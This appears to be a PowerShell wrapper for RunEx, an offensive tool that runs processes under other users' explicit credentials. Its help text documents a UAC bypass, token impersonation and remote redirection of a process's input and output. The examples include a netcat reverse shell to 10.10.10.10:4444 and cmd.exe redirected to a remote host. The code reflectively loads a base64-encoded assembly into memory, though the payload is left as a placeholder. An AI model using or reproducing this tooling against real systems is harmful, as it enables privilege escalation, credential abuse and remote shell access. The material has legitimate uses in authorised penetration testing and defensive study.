function Invoke-RunEx
{
    <#
        .SYNOPSIS
            RunEx is an utility to run specific processes with different permissions
            than the user's current logon provides using explicit credentials.
            Author: @splinter_code
            License: GPL-3.0
            Source: https://github.com/antonioCoco/RunEx

        .PARAMETER Username
            The username of the user
        .PARAMETER Password
            The password of the user
        .PARAMETER Command
            Commandline for the process. Accepts a string, a script
            block, or bare arguments:
              Invoke-RunEx user pass "cmd /c whoami /all"
              Invoke-RunEx user pass { cmd /c whoami /all }
              Invoke-RunEx user pass cmd /c whoami /all
            Use -- or {} to stop parameter binding so command args
            that collide with RunEx flags are not consumed:
              Invoke-RunEx user pass -l 8 -- cmd /c echo -l
              Invoke-RunEx user pass -l 8 { cmd /c echo -l }
        .PARAMETER Domain
            Domain of the user, if in a domain.
            Default: ""
        .PARAMETER LogonType
            Logon type for the new process token.
            Accepts a number or a named alias (case-insensitive):
              2  interactive   Interactive (standard logon)
              3  network       Network (no token caching)
              4  batch         Batch (scheduled tasks)
              5  service       Service (service account)
              7  unlock        Unlock
              8  cleartext     NetworkCleartext
              9  newcreds|netonly  NewCredentials (/netonly)
             10  remote        RemoteInteractive
             11  cached        CachedInteractive
            Default: 2 (Interactive)
        .PARAMETER CreateProcessFunction
            CreateProcess function to use. When not specified,
            auto-detected based on current privileges.
            Accepts a number or a named alias (case-insensitive):
              0  asuser        CreateProcessAsUserW
              1  withtoken     CreateProcessWithTokenW
              2  withlogon     CreateProcessWithLogonW
        .PARAMETER ProcessTimeout
            Wait time in ms for the process to finish and return
            output. 0 = background, no output.
            Default: 120000
        .PARAMETER Remote
            Redirect stdin/stdout/stderr to a remote host.
            Format: host:port. Implies -ProcessTimeout 0.
        .PARAMETER ForceProfile
            Force creation of the user profile directory.
            Ensures correct environment variables.
            WARNING: creates C:\Users\<user> if absent.
        .PARAMETER BypassUac
            Attempt a UAC bypass to get an unfiltered token.
            Only works with -CreateProcessFunction 2 (withlogon).
        .PARAMETER Impersonate
            Create a process and assign the logged-on user's
            token to the main thread.

        .EXAMPLE
            PS>Invoke-RunEx user1 password1 "cmd /c whoami /all"

            Description
            -----------
            Run a command as a specific local user

        .EXAMPLE
            PS>Invoke-RunEx -Domain domain1 -Username user1 -Password password1 -Command "cmd /c whoami /all" -LogonType cleartext

            Description
            -----------
            Run a command as a domain user with NetworkCleartext logon

        .EXAMPLE
            PS>Invoke-RunEx -Username user1 -Password password1 -ProcessTimeout 0 -Command "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"

            Description
            -----------
            Run a background process as a local user

        .EXAMPLE
            PS>Invoke-RunEx -Username user1 -Password password1 -Command cmd.exe -Remote 10.10.10.24:4444

            Description
            -----------
            Redirect stdin, stdout and stderr of the specified command to a remote host

        .EXAMPLE
            PS>Invoke-RunEx user1 password1 -LogonType newcreds -CreateProcessFunction withlogon -Domain DOMAIN { net view \\dc.domain.local }

            Description
            -----------
            Access AD resources with domain credentials (/netonly)

        .EXAMPLE
            PS>Invoke-RunEx -Username adm1 -Password password1 "cmd /c whoami /priv" -BypassUac

            Description
            -----------
            Run a command as an Administrator bypassing UAC

        .EXAMPLE
            PS>Invoke-RunEx -Username adm1 -Password password1 "cmd /c echo admin > C:\Windows\admin" -LogonType cleartext -Impersonate

            Description
            -----------
            Run a command as an Administrator through impersonation

    #>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Username,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $True)]
        [Object]
        $Command,

        [Parameter()]
        [String]
        $Domain = "",

        [Parameter()]
        [String]
        $ProcessTimeout = "120000",

        [Parameter()]
        [String]
        $LogonType = "2",

        [Parameter()]
        [String]
        $CreateProcessFunction,

        [Parameter()]
        [String]
        $Remote,

        [Parameter()]
        [Switch]
        $ForceProfile,

        [Parameter()]
        [Switch]
        $BypassUac,

        [Parameter()]
        [Alias('RemoteImpersonation')]
        [Switch]
        $Impersonate,

        [Parameter(ValueFromRemainingArguments=$true)]
        [String[]]
        $CommandArgs
    )

    if ($Command -is [ScriptBlock]) {
        $Command = $Command.ToString().Trim()
    }
    if ($CommandArgs) {
        $Command = $Command + ' ' + ($CommandArgs -join ' ')
    }

    $parametersRunEx = New-Object Collections.Generic.List[string]
    $parametersRunEx.add($Username)
    $parametersRunEx.add($Password)
    $parametersRunEx.add($Command)
    $parametersRunEx.add("-d")
    $parametersRunEx.add($Domain)
    $parametersRunEx.add("-l")
    $parametersRunEx.add($LogonType)
    $parametersRunEx.add("-t")
    $parametersRunEx.add($ProcessTimeout)

    if( $PSBoundParameters.ContainsKey('CreateProcessFunction') ) {
        $parametersRunEx.add("-f")
        $parametersRunEx.add($CreateProcessFunction)
    }

    if( $PSBoundParameters.ContainsKey('Remote') ) {
        $parametersRunEx.add("-r")
        $parametersRunEx.add($Remote)
    }

    if( $PSBoundParameters.ContainsKey('ForceProfile') ) {
        $parametersRunEx.add("-p")
    }

    if( $PSBoundParameters.ContainsKey('BypassUac') ) {
        $parametersRunEx.add("-b")
    }

    if( $PSBoundParameters.ContainsKey('Impersonate') ) {
        $parametersRunEx.add("-i")
    }

    if( $PSBoundParameters.ContainsKey('Verbose') ) {
        $parametersRunEx.add("-v")
    }

#@@INJECT_BASE64@@
    $RunExBytes = [System.Convert]::FromBase64String($RunExBase64)
    [Reflection.Assembly]::Load($RunExBytes) | Out-Null

    $output = [RunExMainClass]::RunExMain($parametersRunEx.ToArray())
    Write-Output $output
}
